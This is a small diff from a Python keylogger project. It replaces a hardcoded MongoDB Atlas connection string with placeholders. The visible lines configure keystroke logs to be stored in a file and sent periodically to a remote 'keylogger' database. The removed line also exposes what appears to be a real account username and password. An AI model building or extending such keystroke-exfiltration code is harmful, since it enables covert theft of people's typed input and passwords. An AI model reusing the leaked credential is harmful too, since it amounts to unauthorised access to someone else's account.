@@ -18,7 +18,7 @@ SEND_REPORT_EVERY = 60  # as in seconds
 LOG_FILE = 'keylogs.txt'  # File to store logs
 
 # Connect to MongoDB
-client = pymongo.MongoClient("mongodb+srv://samratdey:mongoYzNqs%3DaQT1@keyspy.iarapa1.mongodb.net/")
+client = pymongo.MongoClient("mongodb+srv://<username>:<password>@keyspy.iarapa1.mongodb.net/") #monogDB Atlas connection link
 db = client["keylogger"]
 keylogs_collection = db["keylog"]
 
